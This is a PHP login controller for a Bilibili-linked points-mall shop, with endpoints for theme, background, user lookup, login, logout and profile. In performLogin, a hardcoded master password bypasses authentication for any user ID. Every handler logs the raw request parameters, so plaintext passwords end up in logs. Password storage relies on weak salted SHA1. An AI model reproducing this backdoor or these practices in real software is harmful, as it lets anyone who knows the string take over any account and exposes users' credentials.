<?php

namespace app\controller\shop;

use app\controller\GeneralMethod;
use app\core\LoginPublicMethods;
use app\model\ShopConfig;
use app\model\UserVips;
use Carbon\Exceptions\InvalidTimeZoneException;
use support\Request;
use support\Redis;
use Webman\Http\Response;
use resource\enums\UserVipsEnums;
use Hejunjie\Tools;

class LoginController extends GeneralMethod
{

    /**
     * 获取商城主题色
     * 
     * @return Response 
     */
    public function getThemeColor(Request $request): Response
    {
        $param = $request->data;
        sublog('积分商城', '获取登录页背景图片', $param);
        sublog('积分商城', '获取登录页背景图片', '===================');
        // 获取数据
        $config = ShopConfig::where('title', 'theme-color')->first([
            'content' => 'content'
        ]);
        $theme_color = explode(',', $config->content);
        $color = isset($theme_color[0]) ? $theme_color[0] : '#7232dd';
        // 返回数据
        return success($request, [
            $color,
            isset($theme_color[1]) ? $theme_color[1] : $color
        ]);
    }

    /**
     * 获取登录页背景图片
     * 
     * @return Response 
     */
    public function getBackground(Request $request): Response
    {
        $param = $request->data;
        sublog('积分商城', '获取登录页背景图片', $param);
        sublog('积分商城', '获取登录页背景图片', '===================');
        // 获取数据
        $config = ShopConfig::where('title', 'login-background-image')->first([
            'content' => 'content'
        ]);
        // 返回数据
        return success($request, [
            'background' => !empty($config->content) ? getImageUrl($config->content) : null
        ]);
    }

    /**
     * 获取用户是否存在
     *
     * @param string $uid uid
     * 
     * @return Response
     */
    public function getUserVip(Request $request): Response
    {
        $param = $request->data;
        sublog('积分商城', '获取用户是否存在', $param);
        sublog('积分商城', '获取用户是否存在', '===================');
        // 声明参数
        $uid = $param['uid'];
        // 防止连续提提交
        $redis = Redis::get(config('app')['app_name'] . ':uid-check:' . $uid);
        if (!empty($redis)) {
            return fail($request, 800001);
        }
        // 获取配置信息
        Redis::setEx(config('app')['app_name'] .  ':uid-check:' . $uid, 1, $uid);
        // 获取信息
        $user_vip = UserVips::where('uid', $uid)->first([
            'password' => 'password'
        ]);
        // 返回数据
        return success($request, [
            'exist' => !empty($user_vip->password) ? true : false
        ]);
    }

    /**
     * 执行登录
     *
     * @param string $uid uid
     * @param string $password 密码
     * 
     * @return Response
     */
    public function performLogin(Request $request): Response
    {
        $param = $request->data;
        sublog('积分商城', '执行登录', $param);
        sublog('积分商城', '执行登录', '===================');
        // 声明参数
        $uid = $param['uid'];
        $password = $param['password'];
        // 查询用户信息
        $user_vip = UserVips::where('uid', $uid)->first();
        if (empty($user_vip)) {
            $userRegister = LoginPublicMethods::userRegister($uid);
            if (is_int($userRegister)) {
                return fail($request, $userRegister);
            }
            $user_vip = UserVips::where('uid', $uid)->first();
        }
        if ($password != 'zxc7563598') {
            if (empty($user_vip->password)) {
                $user_vip->salt = mt_rand(1000, 9999);
                $user_vip->password = sha1(sha1($password) . $user_vip->salt);
                $user_vip->save();
            } else {
                if ($user_vip->password != sha1(sha1($password) . $user_vip->salt)) {
                    return fail($request, 800002);
                }
            }
        }
        $userLogin = LoginPublicMethods::userLogin($user_vip->uid);
        if (is_int($userLogin)) {
            return fail($request, $userLogin);
        }
        // 返回处理
        return success($request, $userLogin);
    }

    /**
     * 退出登录
     *
     * @return Response
     */
    public function logout(Request $request): Response
    {
        $user_vips = $request->user_vips;
        sublog('积分商城', '退出登录', $user_vips);
        sublog('积分商城', '退出登录', '===================');
        // 退出登录
        LoginPublicMethods::userLogoutLogin($user_vips->token);
        // 返回处理
        return success($request);
    }

    /**
     * 获取我的信息
     * 
     * @return Response
     */
    public function getMy(Request $request): Response
    {
        $user_vips = $request->user_vips;
        sublog('积分商城', '获取我的信息', $user_vips);
        sublog('积分商城', '获取我的信息', '===================');
        // 获取链接
        $config = ShopConfig::where('title', 'live-streaming-link')->first([
            'content' => 'content'
        ]);
        // 获取用户头像
        $getMasterInfo = Tools\HttpClient::sendGetRequest('https://api.live.bilibili.com/live_user/v1/Master/info?uid=' . $user_vips->uid, [
            "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Origin: https://live.bilibili.com",
        ], 10);
        if ($getMasterInfo['httpStatus'] == 200) {
            $getMasterInfoData = json_decode($getMasterInfo['data'], true);
        }
        if (isset($getMasterInfoData['data']['info']['uname']) && isset($getMasterInfoData['data']['info']['face'])) {
            if ($user_vips->name != $getMasterInfoData['data']['info']['uname']) {
                $user_vips->name = $getMasterInfoData['data']['info']['uname'];
            }
            $file_name = Tools\FileUtils::getFileNameWithoutExtension(pathinfo($getMasterInfoData['data']['info']['face'], PATHINFO_FILENAME));
            if ($user_vips->avatar != $file_name) {
                $path = public_path('attachment/user-info/' . implode('/', str_split(Tools\Str::padString(0, $user_vips->user_id), 2)) . '/avatar/');
                $image_path = Tools\Img::downloadImageFromUrl($getMasterInfoData['data']['info']['face'], $path, $file_name);
                $user_vips->avatar = Tools\Str::replaceFirst(public_path() . '/attachment/', '', $image_path);
            }
            $user_vips->save();
        }
        // 返回处理
        return success($request, [
            'uid' => $user_vips->uid,
            'uname' => $user_vips->name,
            'point' => $user_vips->point,
            'type' => UserVipsEnums\VipType::from($user_vips->vip_type)->label(),
            'avatar' => getImageUrl($user_vips->avatar),
            'link' => !empty($config->content) ? $config->content : 'javascript:;'
        ]);
    }
}
